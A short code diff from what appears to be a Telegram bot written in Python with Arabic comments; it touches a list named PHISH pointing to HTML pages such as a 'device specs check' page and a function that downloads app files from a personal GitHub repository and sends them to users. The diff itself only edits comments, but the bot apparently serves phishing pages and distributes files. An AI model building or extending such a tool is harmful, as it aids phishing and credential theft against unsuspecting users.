@@ -47,7 +47,7 @@ PHISH = [
     ("📱 فحص مواصفات الجهاز", "device.html")
 ]
 
-# ========== قسم التطبيقات (روابط GitHub Raw) ==========
+# ========== قسم التطبيقات (تم تصحيح الأسماء) ==========
 GITHUB_RAW = "https://raw.githubusercontent.com/a77094048-art/bot/main/"
 
 APPS = [
@@ -235,7 +235,6 @@ def callback(call):
     elif data.startswith("app|"):
         filename = data.split("|")[1]
         file_url = GITHUB_RAW + filename
-        # تنزيل وإرسال الملف
         try:
             bot.answer_callback_query(call.id, text="جاري التحميل...")
             resp = requests.get(file_url, timeout=15)
